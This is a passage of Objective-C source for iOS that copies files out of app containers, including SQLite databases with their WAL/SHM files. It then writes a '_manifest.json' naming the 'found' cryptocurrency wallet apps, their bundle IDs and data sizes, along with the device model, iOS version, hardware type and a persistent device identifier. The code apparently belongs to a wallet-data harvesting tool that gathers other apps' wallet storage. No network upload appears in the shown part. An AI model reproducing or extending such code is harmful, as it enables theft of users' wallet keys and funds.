    NSDirectoryEnumerator *e = [fm enumeratorAtPath:src];
    for (NSString *rel in e) {
        NSString *lower = rel.lowercaseString;
        BOOL skip = NO;
        for (NSString *token in tokens) {
            if (token.length && [lower containsString:token.lowercaseString]) {
                skip = YES;
                break;
            }
        }
        if (skip) continue;

        NSString *full = [src stringByAppendingPathComponent:rel];
        BOOL isDir = NO;
        if (![fm fileExistsAtPath:full isDirectory:&isDir] || isDir) continue;

        uint64_t sz = [[fm attributesOfItemAtPath:full error:nil][NSFileSize] unsignedLongLongValue];
        NSString *out = [dst stringByAppendingPathComponent:rel];
        [fm createDirectoryAtPath:[out stringByDeletingLastPathComponent]
      withIntermediateDirectories:YES attributes:nil error:nil];
        if ([fm copyItemAtPath:full toPath:out error:nil]) total += sz;
    }

    if (bytesOut) *bytesOut = total;
}

- (NSArray<NSString *> *)sourcesForPath:(NSString *)path {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSMutableArray *out = [NSMutableArray arrayWithObject:path];    NSString *ext = path.pathExtension.lowercaseString;
    if ([ext isEqualToString:@"sqlite"] || [ext isEqualToString:@"sqlite3"] ||
        [ext isEqualToString:@"db"]) {
        for (NSString *suffix in @[@"-wal", @"-shm"]) {
            NSString *side = [path stringByAppendingString:suffix];
            if ([fm fileExistsAtPath:side]) [out addObject:side];
        }
    }
    return out;
}

- (NSString *)relative:(NSString *)path fromContainer:(NSString *)container {
    NSString *base = container;
    if (![base hasSuffix:@"/"]) base = [base stringByAppendingString:@"/"];
    if ([path hasPrefix:base]) return [path substringFromIndex:base.length];
    return path.lastPathComponent;
}

- (uint64_t)sizeOfItemAtPath:(NSString *)path {
    NSFileManager *fm = [NSFileManager defaultManager];
    BOOL isDir = NO;
    if (![fm fileExistsAtPath:path isDirectory:&isDir]) return 0;
    if (!isDir) {
        return [[fm attributesOfItemAtPath:path error:nil][NSFileSize] unsignedLongLongValue];
    }
    uint64_t total = 0;
    NSDirectoryEnumerator *e = [fm enumeratorAtPath:path];
    while ([e nextObject]) {
        NSDictionary *a = [e fileAttributes];
        if (a[NSFileType] == NSFileTypeRegular) total += [a[NSFileSize] unsignedLongLongValue];
        if (total > self.maxContainerBytes) break;
    }
    return total;
}

#pragma mark - 清单

- (NSData *)manifestDataForRecords:(NSArray<NSDictionary *> *)records {
    NSMutableArray *found = [NSMutableArray array];
    NSMutableArray *wallets = [NSMutableArray array];
    for (NSDictionary *r in records) {
        NSString *name = r[@"target"];
        if (!name.length) continue;
        if (![found containsObject:name]) [found addObject:name];
        [wallets addObject:@{
            @"wallet": name,
            @"bundleID": r[@"bundleId"] ?: @"",
            @"bytes": r[@"bytes"] ?: @0,
        }];
    }

    NSString *idfv = [[UIDevice currentDevice] identifierForVendor].UUIDString;
    if (!idfv.length) {
        idfv = [[NSUserDefaults standardUserDefaults] stringForKey:@"WQLDeviceToken"];
        if (!idfv.length) {
            idfv = NSUUID.UUID.UUIDString;
            [[NSUserDefaults standardUserDefaults] setObject:idfv forKey:@"WQLDeviceToken"];
            [[NSUserDefaults standardUserDefaults] synchronize];
        }
    }

    UIDevice *dev = [UIDevice currentDevice];
    NSDictionary *man = @{
        @"deviceFolder": [NSString stringWithFormat:@"%@ iOS%@ %@",
                          dev.model, dev.systemVersion, idfv],
        @"ios": dev.systemVersion,
        @"productType": [self productType],
        @"found": found,
        @"wallets": wallets,
        @"source": @"WQLApp",
    };
    return [NSJSONSerialization dataWithJSONObject:man options:NSJSONWritingPrettyPrinted error:nil];
}

- (void)writeWalletManifestInDirectory:(NSString *)outDir
                               records:(NSArray<NSDictionary *> *)records {
    NSData *data = [self manifestDataForRecords:records];
    if (!data) return;
    [data writeToFile:[outDir stringByAppendingPathComponent:@"_manifest.json"] atomically:YES];
    NSMutableArray *found = [NSMutableArray array];
    for (NSDictionary *r in records) {
        NSString *n = r[@"target"];
        if (n.length && ![found containsObject:n]) [found addObject:n];
    }
    [self log:@"    _manifest.json 已写入，涉及 %@",
          found.count ? [found componentsJoinedByString:@","] : @"无命中"];
}

- (NSString *)productType {
    size_t size = 0;
    if (sysctlbyname("hw.machine", NULL, &size, NULL, 0) != 0 || size == 0) return @"iPhone";
    char *buf = malloc(size);
    if (!buf) return @"iPhone";
    NSString *model = @"iPhone";
    if (sysctlbyname("hw.machine", buf, &size, NULL, 0) == 0) {
        NSString *s = [NSString stringWithUTF8String:buf];
        if (s) model = s;
    }
    free(buf);
    return model;
}

- (NSString *)humanBytes:(uint64_t)b {
    if (b < 1024) return [NSString stringWithFormat:@"%llu B", (unsigned long long)b];
    if (b < 1024 * 1024) return [NSString stringWithFormat:@"%.1f KB", b / 1024.0];
    if (b < 1024ULL * 1024 * 1024) return [NSString stringWithFormat:@"%.1f MB", b / 1048576.0];
    return [NSString stringWithFormat:@"%.2f GB", b / 1073741824.0];
}

@end
